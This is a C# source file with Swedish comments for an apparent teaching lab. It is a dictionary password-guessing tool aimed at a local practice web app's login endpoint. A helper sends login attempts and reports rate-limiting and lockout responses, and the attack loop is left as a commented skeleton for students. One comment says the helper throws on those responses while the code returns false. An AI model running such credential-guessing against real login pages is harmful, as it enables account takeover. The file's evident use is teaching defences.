using System.Diagnostics;
using System.Net;
using System.Net.Http.Json;

// Attackverktyg mot BruteForceLab.Web. Starta webben först (den lyssnar på
// http://localhost:5080), kör sedan detta program i ett andra fönster.
//
// Din uppgift i steg 2: skriv loopen som provar varje lösenord i ordlistan.
// Hjälpmetoden ProvaLoggaIn nedan är redan klar, den gör ett POST-anrop till
// /login och returnerar true vid träff.

const string basAdress = "http://localhost:5080";
const string anvandarnamn = "offer";

// Läs ordlistan relativt appens egen katalog, inte arbetskatalogen, så att den
// hittas även när du kör "dotnet run --project ..." från repo-roten.
var ordlistaSökväg = Path.Combine(AppContext.BaseDirectory, "wordlist.txt");
var ordlista = await File.ReadAllLinesAsync(ordlistaSökväg);
using var http = new HttpClient { BaseAddress = new Uri(basAdress) };

Console.WriteLine($"Startar attack mot {basAdress}/login som användare '{anvandarnamn}'.");
Console.WriteLine($"Ordlistan innehåller {ordlista.Length} lösenord.\n");

var klocka = Stopwatch.StartNew();
var antalFörsök = 0;

// TODO steg 2: skriv loopen. Gå igenom ordlistan, räkna försöken och
// stanna vid första träff. Skelett:
//
// foreach (var lösenord in ordlista)
// {
//     antalFörsök++;
//     if (await ProvaLoggaIn(anvandarnamn, lösenord))
//     {
//         Console.WriteLine($"Träff efter {antalFörsök} försök: {lösenord}");
//         break;
//     }
// }

klocka.Stop();
Console.WriteLine($"\nAntal försök: {antalFörsök}");
Console.WriteLine($"Tid: {klocka.ElapsedMilliseconds} ms");

// Gör ett inloggningsförsök. Returnerar true vid rätt lösenord (200 OK).
// Kastar om servern svarar 429 (rate limiting) eller 423 (kontolåst) så att
// du ser i konsolen exakt när ett skydd slår till.
async Task<bool> ProvaLoggaIn(string namn, string losenord)
{
    var svar = await http.PostAsJsonAsync("/login",
        new { anvandarnamn = namn, losenord });

    if (svar.StatusCode == HttpStatusCode.TooManyRequests)
    {
        Console.WriteLine("  -> 429 Too Many Requests: rate limiting slog till.");
        return false;
    }

    if (svar.StatusCode == HttpStatusCode.Locked)
    {
        Console.WriteLine("  -> 423 Locked: kontot är låst.");
        return false;
    }

    return svar.IsSuccessStatusCode;
}
